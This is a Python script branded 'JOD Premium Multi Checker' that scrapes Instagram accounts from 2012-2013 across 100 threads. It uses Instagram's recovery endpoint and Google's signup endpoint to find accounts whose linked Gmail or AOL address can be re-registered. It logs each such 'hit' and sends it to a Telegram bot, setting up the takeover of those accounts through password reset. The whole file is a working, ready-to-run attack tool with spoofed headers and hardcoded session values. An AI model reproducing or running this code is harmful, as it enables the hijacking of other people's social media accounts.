
import os
import sys
import re
import json
import string
import random
import hashlib
import uuid
import time
from datetime import datetime
from threading import Thread, Lock
import requests
from requests import post as pp
from user_agent import generate_user_agent
from random import choice, randrange
import webbrowser
from colorama import Fore, Style, init


# Initialize colorama
init(autoreset=True)


# UI Colors - Enhanced
J = Fore.LIGHTYELLOW_EX + Style.BRIGHT    # Bright Yellow
O = Fore.LIGHTCYAN_EX + Style.BRIGHT      # Bright Cyan
D = Fore.LIGHTMAGENTA_EX + Style.BRIGHT   # Bright Magenta
W = Fore.LIGHTWHITE_EX + Style.BRIGHT     # Bright White
G = Fore.LIGHTGREEN_EX + Style.BRIGHT     # Bright Green
R = Fore.LIGHTRED_EX + Style.BRIGHT       # Bright Red
Y = Fore.YELLOW + Style.BRIGHT            # Bright Yellow
B = Fore.LIGHTBLUE_EX + Style.BRIGHT      # Bright Blue
P = Fore.LIGHTMAGENTA_EX + Style.BRIGHT   # Bright Pink
C = Fore.CYAN + Style.BRIGHT              # Bright Cyan
GR = Fore.LIGHTBLACK_EX                   # Gray


# Clear screen
os.system('clear' if os.name == 'posix' else 'cls')


# Premium ASCII Art Banner
ascii_art = f"""
⠀⠀⠀⢠⣾⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢰⣿⣿⣿⣿⣿⣿⣷⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣄⣀⣀⣤⣤⣶⣾⣿⣿⣿⡷
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠏⠀⠀⠀⠀
⣿⣿⣿⡇⠀⡾⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀
⣿⣿⣿⣧⡀⠁⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠉⢹⠉⠙⣿⣿⣿⣿⣿⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣀⠀⣀⣼⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠀⠤⢀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⠿⠋⢃⠈⠢⡁⠒⠄⡀⠈⠁⠀⠀⠀⠀⠀⠀⠀
⣿⣿⠟⠁⠀⠀⠈⠉⠉⠁⠀⠀⠀⠀⠈⠆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
"""


# Premium styled banner
premium_banner = f"""
{J}╔═══════════════════════════════════════════════════════════════════════════════╗{W}
{J}║                                                                               ║{W}
{J}║{ascii_art}{J}║{W}
{J}║                                                                               ║{W}
{J}╠═══════════════════════════════════════════════════════════════════════════════╣{W}
{J}║{D}                         🔥 JOD PREMIUM MULTI CHECKER 🔥                      {J}║{W}
{J}║{P}                        📧 Gmail + AOL Dual Validator 📧                     {J}║{W}
{J}║{C}                             🎯 @co4ig Exclusive Tool 🎯                       {J}║{W}
{J}║{O}                          ⚡ Multi-Threaded Beast Mode ⚡                     {J}║{W}
{J}╚═══════════════════════════════════════════════════════════════════════════════╝{W}

{G}┌───────────────────────────────────────────────────────────────────────────────┐{W}
{G}│                         🚀 INITIALIZATION SEQUENCE 🚀                         │{W}
{G}└───────────────────────────────────────────────────────────────────────────────┘{W}
"""

print(premium_banner)

# Open Telegram channel with fancy message
print(f"{J}[{W}🌐{J}]{C} Opening Telegram Channel...{W}")
webbrowser.open('https://t.me/co4ig')
time.sleep(1)
print(f"{J}[{G}✓{J}]{G} Telegram Channel Loaded Successfully!{W}")

# Constants
INSTAGRAM_RECOVERY_URL = 'https://i.instagram.com/api/v1/accounts/send_recovery_flow_email/'
IG_SIG_KEY_VERSION = 'ig_sig_key_version'
SIGNED_BODY = 'signed_body'
COOKIE_VALUE = 'mid=ZVfGvgABAAGoQqa7AY3mgoYBV1nP; csrftoken=9y3N5kLqzialQA7z96AMiyAKLMBWpqVj'
CONTENT_TYPE_HEADER = 'Content-Type'
COOKIE_HEADER = 'Cookie'
USER_AGENT_HEADER = 'User-Agent'

GOOGLE_ACCOUNTS_URL = 'https://accounts.google.com'
GOOGLE_ACCOUNTS_DOMAIN = 'accounts.google.com'
REFERRER_HEADER = 'referer'
ORIGIN_HEADER = 'origin'
AUTHORITY_HEADER = 'authority'
CONTENT_TYPE_FORM = 'application/x-www-form-urlencoded; charset=UTF-8'
CONTENT_TYPE_FORM_ALT = 'application/x-www-form-urlencoded;charset=UTF-8'

TOKEN_FILE = 'tl.txt'

# Global counters with thread safety
total_hits = 0
hits_gmail = 0
hits_aol = 0
bad_insta = 0
bad_gmail = 0
bad_aol = 0
checked_accounts = 0
counter_lock = Lock()

# Fancy input prompts
print(f"\n{Y}┌─────────────────────────────────────────────────────────────────────────────┐{W}")
print(f"{Y}│{W}                          📋 CONFIGURATION SETUP 📋                          {Y}│{W}")
print(f"{Y}└─────────────────────────────────────────────────────────────────────────────┘{W}")

ID = input(f"\n{J}[{P}📱{J}]{W} Enter Telegram Chat ID {G}➤{W} ")
TOKEN = input(f"{J}[{P}🤖{J}]{W} Enter Bot Token {G}➤{W} ")

# Loading animation
print(f"\n{J}[{C}⚡{J}]{Y} Initializing JOD Premium Multi Checker...{W}")
for i in range(3):
    print(f"{GR}{'.' * (i + 1)}{W}", end='\r')
    time.sleep(0.5)

# Clear and show active status
os.system('clear' if os.name == 'posix' else 'cls')

# Active status banner
active_banner = f"""
{G}╔═══════════════════════════════════════════════════════════════════════════════╗{W}
{G}║{ascii_art}{G}║{W}
{G}╠═══════════════════════════════════════════════════════════════════════════════╣{W}
{G}║{Y}                            🚀 JOD STATUS: ACTIVE 🚀                            {G}║{W}
{G}╠═══════════════════════════════════════════════════════════════════════════════╣{W}
{G}║{C} 🎯 Target Range    : 2012-2013 Instagram Accounts                           {G}║{W}
{G}║{B} 📧 Email Types     : Gmail + AOL Dual Validation                            {G}║{W}
{G}║{P} 🔥 Threads Count   : 100 Concurrent Workers                                 {G}║{W}
{G}║{O} ⚡ Speed Mode      : Maximum Performance                                     {G}║{W}
{G}║{D} 💎 Version        : Premium @co4ig JOD Edition                              {G}║{W}
{G}║{J} 📱 Telegram       : Auto-Send Enabled                                       {G}║{W}
{G}╚═══════════════════════════════════════════════════════════════════════════════╝{W}

{Y}┌─────────────────────────────────────────────────────────────────────────────┐{W}
{Y}│{W}                        📊 LIVE PERFORMANCE MONITOR 📊                        {Y}│{W}
{Y}└─────────────────────────────────────────────────────────────────────────────┘{W}
{GR}═════════════════════════════════════════════════════════════════════════════════{W}
"""

print(active_banner)

def update_stats():
    with counter_lock:
        total = hits_gmail + hits_aol
        bad_total = bad_gmail + bad_aol
        stats = f"\r{G}🎯 Gmail Hits{W}: {Y}{hits_gmail:>4}{W} {GR}│{P} 🎯 AOL Hits{W}: {P}{hits_aol:>4}{W} {GR}│{R} ❌ Bad IG{W}: {R}{bad_insta:>4}{W} {GR}│{R} ❌ Bad Email{W}: {R}{bad_total:>4}{W} {GR}│{B} 📊 Checked{W}: {B}{checked_accounts:>6}{W}"
        sys.stdout.write(stats)
        sys.stdout.flush()

def date_from_id(user_id):
    try:
        if isinstance(user_id, str):
            user_id = int(user_id)
        
        # 2012-2013 range only
        if 17750001 <= user_id <= 279760000:      # 2012 accounts
            return 2012
        elif 279760001 <= user_id <= 900990000:   # 2013 accounts  
            return 2013
        else:
            return None
    except Exception:
        return None

def generate_gmail_token():
    try:
        alphabet = 'azertyuiopmlkjhgfdsqwxcvbn'
        n1 = ''.join(choice(alphabet) for _ in range(randrange(6, 9)))
        n2 = ''.join(choice(alphabet) for _ in range(randrange(3, 9)))
        host = ''.join(choice(alphabet) for _ in range(randrange(15, 30)))
        
        headers = {
            'accept': '*/*',
            'accept-language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en;q=0.7,en-US;q=0.6',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            USER_AGENT_HEADER: str(generate_user_agent())
        }
        
        recovery_url = f"{GOOGLE_ACCOUNTS_URL}/signin/v2/usernamerecovery?flowName=GlifWebSignIn&flowEntry=ServiceLogin&hl=en-GB"
        res1 = requests.get(recovery_url, headers=headers, timeout=10)
        
        tok_match = re.search(
            r'data-initial-setup-data=\"%.@.null,null,null,null,null,null,null,null,null,&quot;(.*?)&quot;,null,null,null,&quot;(.*?)&',
            res1.text
        )
        
        if not tok_match:
            return
        
        tok = tok_match.group(2)
        cookies = {'__Host-GAPS': host}
        
        headers2 = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f'https://accounts.google.com/signup/v2/createaccount?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&theme=mn',
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        data = {
            'f.req': f"[\"{tok}\",\"{n1}\",\"{n2}\",\"{n1}\",\"{n2}\",0,0,null,null,\"web-glif-signup\",0,null,1,[],1]",
            'deviceinfo': '[null,null,null,null,null,"NL",null,null,null,"GlifWebSignIn",null,[],null,null,null,null,2,null,0,1,"",null,null,2,2]'
        }
        
        response = requests.post(f"{GOOGLE_ACCOUNTS_URL}/_/signup/validatepersonaldetails",
                                cookies=cookies, headers=headers2, data=data, timeout=10)
        
        if response.text:
            token_line = str(response.text).split('",null,"')[1].split('"')[0]
            host = response.cookies.get_dict().get('__Host-GAPS', '')
            
            with open(TOKEN_FILE, 'w') as f:
                f.write(f"{token_line}//{host}\n")
                
    except Exception:
        generate_gmail_token()

generate_gmail_token()

def check_gmail(email):
    global bad_gmail, hits_gmail
    try:
        if '@' in email:
            email = email.split('@')[0]
            
        with open(TOKEN_FILE, 'r') as f:
            token_data = f.read().splitlines()[0]
        tl, host = token_data.split('//')
        
        cookies = {'__Host-GAPS': host}
        headers = {
            AUTHORITY_HEADER: GOOGLE_ACCOUNTS_DOMAIN,
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.9',
            CONTENT_TYPE_HEADER: CONTENT_TYPE_FORM_ALT,
            'google-accounts-xsrf': '1',
            ORIGIN_HEADER: GOOGLE_ACCOUNTS_URL,
            REFERRER_HEADER: f"https://accounts.google.com/signup/v2/createusername?service=mail&continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&TL={tl}",
            USER_AGENT_HEADER: generate_user_agent()
        }
        
        params = {'TL': tl}
        data = (f"continue=https%3A%2F%2Fmail.google.com%2Fmail%2Fu%2F0%2F&ddm=0&flowEntry=SignUp&service=mail&theme=mn"
                f"&f.req=%5B%22TL%3A{tl}%22%2C%22{email}%22%2C0%2C0%2C1%2Cnull%2C0%2C5167%5D"
                "&azt=AFoagUUtRlvV928oS9O7F6eeI4dCO2r1ig%3A1712322460888&cookiesDisabled=false"
                "&deviceinfo=%5Bnull%2Cnull%2Cnull%2Cnull%2Cnull%2C%22NL%22%2Cnull%2Cnull%2Cnull%2C%22GlifWebSignIn%22"
                "%2Cnull%2C%5B%5D%2Cnull%2Cnull%2Cnull%2Cnull%2C2%2Cnull%2C0%2C1%2C%22%22%2Cnull%2Cnull%2C2%2C2%5D"
                "&gmscoreversion=undefined&flowName=GlifWebSignIn&")
        
        response = pp(f"{GOOGLE_ACCOUNTS_URL}/_/signup/usernameavailability",
                     params=params, cookies=cookies, headers=headers, data=data, timeout=10)
        
        if '"gf.uar",1' in response.text:
            with counter_lock:
                hits_gmail += 1
            update_stats()
            return True
        else:
            with counter_lock:
                bad_gmail += 1
            update_stats()
            return False
            
    except Exception:
        with counter_lock:
            bad_gmail += 1
        update_stats()
        return False

def rest_instagram(user):
    try:
        headers = {
            'X-Pigeon-Session-Id': '50cc6861-7036-43b4-802e-fb4282799c60',
            'X-Pigeon-Rawclienttime': '1700251574.982',
            'X-IG-Connection-Speed': '-1kbps',
            'X-IG-Bandwidth-Speed-KBPS': '-1.000',
            'X-IG-Bandwidth-TotalBytes-B': '0',
            'X-IG-Bandwidth-TotalTime-MS': '0',
            'X-Bloks-Version-Id': 'c80c5fb30dfae9e273e4009f03b18280bb343b0862d663f31a3c63f13a9f31c0',
            'X-IG-Connection-Type': 'WIFI',
            'X-IG-Capabilities': '3brTvw==',
            'X-IG-App-ID': '567067343352427',
            USER_AGENT_HEADER: 'Instagram 100.0.0.17.129 Android (29/10; 420dpi; 1080x2129; samsung; SM-M205F; m20lte; exynos7904; en_GB; 161478664)',
            'Accept-Language': 'en-GB, en-US',
            COOKIE_HEADER: COOKIE_VALUE,
            CONTENT_TYPE_HEADER: 'application/x-www-form-urlencoded; charset=UTF-8',
            'Accept-Encoding': 'gzip, deflate',
            'Host': 'i.instagram.com',
            'X-FB-HTTP-Engine': 'Liger',
            'Connection': 'keep-alive',
            'Content-Length': '356',
        }
        
        data = {
            SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                         '{"_csrftoken":"9y3N5kLqzialQA7z96AMiyAKLMBWpqVj",' +
                         '"adid":"0dfaf820-2748-4634-9365-c3d8c8011256",' +
                         '"guid":"1f784431-2663-4db9-b624-86bd9ce1d084",' +
                         '"device_id":"android-b93ddb37e983481c",' +
                         '"query":"' + user + '"}'),
            IG_SIG_KEY_VERSION: '4'
        }
        
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=10).json()
        return response.get('email', 'Reset None')
    except:
        return 'Reset None'

def get_instagram_info(username):
    try:
        headers = {
            'Host': 'www.bradychrist.top',
            'Connection': 'keep-alive',
            'Content-Length': '13',
            'package': 'ins.bradychrist.com',
            'apptype': 'android',
            'User-Agent': 'Mozilla/5.0 (Linux; Android 13; ANY-LX2 Build/HONORANY-L22CQ; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/122.0.6261.106 Mobile Safari/537.36',
            'Content-Type': 'application/x-www-form-urlencoded;charset=UTF-8',
            'idfa': 'a77d4e36-8e29-433f-9525-80915ab1ef23',
            'Accept': 'application/json, text/plain, */*',
            'pk': '',
            'username': '',
            'version': '1.0',
            'Origin': 'http://www.bradychrist.top',
            'X-Requested-With': 'ins.bradychrist.com',
            'Referer': f'http://www.bradychrist.top/{username}/',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'ar-IQ,ar;q=0.9,en-IQ;q=0.8,en-US;q=0.7,en;q=0.6',
        }
        
        response = requests.post("http://www.bradychrist.top/api/v7/user", 
                                headers=headers, 
                                data={"username": username}, 
                                timeout=10)
        
        return response.json()
    except:
        return None

def check_instagram_email(email_type, email):
    global bad_insta
    ua = generate_user_agent()
    dev = 'android-'
    device_id = dev + hashlib.md5(str(uuid.uuid4()).encode()).hexdigest()[:16]
    uui = str(uuid.uuid4())
    
    headers = {
        USER_AGENT_HEADER: ua,
        COOKIE_HEADER: COOKIE_VALUE,
        CONTENT_TYPE_HEADER: 'application/x-www-form-urlencoded; charset=UTF-8'
    }
    
    data = {
        SIGNED_BODY: ('0d067c2f86cac2c17d655631c9cec2402012fb0a329bcafb3b1f4c0bb56b1f1f.' +
                     json.dumps({
                         '_csrftoken': '9y3N5kLqzialQA7z96AMiyAKLMBWpqVj',
                         'adid': uui,
                         'guid': uui,
                         'device_id': device_id,
                         'query': email
                     })),
        IG_SIG_KEY_VERSION: '4'
    }
    
    try:
        response = requests.post(INSTAGRAM_RECOVERY_URL, headers=headers, data=data, timeout=10).text
        
        if email in response:
            # Instagram has this email, now check if email is available
            username = email.split('@')[0]
            
            if email_type == 'gmail':
                if check_gmail(email):
                    send_hit_to_telegram(email_type, username, email)
            elif email_type == 'aol':
                # AOL is always considered available (as in original script)
                global hits_aol
                with counter_lock:
                    hits_aol += 1
                update_stats()
                send_hit_to_telegram(email_type, username, email)
                
        else:
            with counter_lock:
                bad_insta += 1
            update_stats()
            
    except Exception:
        with counter_lock:
            bad_insta += 1
        update_stats()

def send_hit_to_telegram(email_type, username, email):
    global total_hits
    
    # Get Instagram info
    insta_info = get_instagram_info(username)
    reset_email = rest_instagram(username)
    
    with counter_lock:
        total_hits += 1
        current_hit = total_hits
    
    # Prepare account details
    if insta_info and insta_info.get('data'):
        data = insta_info['data']
        user_id = data.get('userPk', 'N/A')
        followers = data.get('followerNum', 0)
        following = data.get('followingNum', 0) 
        posts = data.get('postsNum', 0)
        account_date = date_from_id(user_id) if user_id != 'N/A' else 'Unknown'
    else:
        user_id = 'N/A'
        followers = 0
        following = 0
        posts = 0
        account_date = 'Unknown'
    
    # Create message based on email type
    emoji = '📧' if email_type == 'gmail' else '📮'
    email_provider = email_type.upper()
    
    telegram_message = f"""🎯 JOD PREMIUM {email_provider} HIT 🎯


{emoji} Hit Number: #{current_hit}
👤 Username: @{username}
📧 Email: {email}
👥 Followers: {followers:,}
👤 Following: {following:,}
📸 Posts: {posts}
📅 Account Age: {account_date}
🆔 ID: {user_id}
🔄 Reset Email: {reset_email}


💎 @co4ig JOD Premium Edition"""
    
    # Save to appropriate file
    filename = f'jod-{email_type}-hits.txt'
    with open(filename, 'a', encoding='utf-8') as f:
        f.write(f"\n{'='*60}\n")
        f.write(telegram_message)
        f.write(f"\n{'='*60}\n")
    
    # Send to Telegram
    try:
        import urllib.parse
        encoded_message = urllib.parse.quote(telegram_message)
        telegram_url = f"https://api.telegram.org/bot{TOKEN}/sendMessage?chat_id={ID}&text={encoded_message}"
        requests.get(telegram_url, timeout=15)
        print(f"\n{G}[{W}🎯{G}] {email_provider} Hit #{current_hit} sent: {C}@{username}{W}")
    except Exception as e:
        print(f"\n{R}[{W}❌{R}] Failed to send {email_provider} hit #{current_hit}: {e}{W}")

def main_checker():
    global checked_accounts
    session = requests.Session()
    
    while True:
        try:
            # Generate random ID in 2012-2013 range
            account_id = random.randint(17750001, 900990000)
            
            data = {
                'lsd': ''.join(random.choices(string.ascii_letters + string.digits, k=32)),
                'variables': json.dumps({
                    'id': account_id,
                    'render_surface': 'PROFILE'
                }),
                'doc_id': '25618261841150840'
            }
            
            headers = {'X-FB-LSD': data['lsd']}
            
            response = session.post('https://www.instagram.com/api/graphql', 
                                   headers=headers, data=data, timeout=10)
            
            if response.status_code == 200:
                account = response.json().get('data', {}).get('user', {})
                username = account.get('username')
                
                with counter_lock:
                    checked_accounts += 1
                update_stats()
                
                if username:
                    account_date = date_from_id(account_id)
                    
                    # Only check accounts from 2012-2013
                    if account_date and account_date in [2012, 2013]:
                        # Check both Gmail and AOL
                        gmail_email = f"{username}@gmail.com"
                        aol_email = f"{username}@aol.com"
                        
                        # Check Gmail
                        check_instagram_email('gmail', gmail_email)
                        time.sleep(0.1)
                        
                        # Check AOL
                        check_instagram_email('aol', aol_email)
            
            time.sleep(0.1)
            
        except Exception:
            pass

# Launch sequence
print(f"\n{G}[{W}🚀{G}] JOD Premium Multi Checker Initialized Successfully!{W}")
print(f"{G}[{W}🎯{G}] Targeting 2012-2013 accounts with Gmail + AOL validation{W}")
print(f"{G}[{W}⚡{G}] All 100 threads activated | @co4ig JOD Premium{W}")
print(f"{J}{'═'*80}{W}\n")

# Start 100 threads
threads = []
for _ in range(100):
    t = Thread(target=main_checker)
    t.daemon = True
    threads.append(t)
    t.start()

# Keep main thread alive
try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    print(f"\n{R}[{W}⚠️{R}] JOD Premium Multi Checker terminated by user{W}")
    sys.exit(0)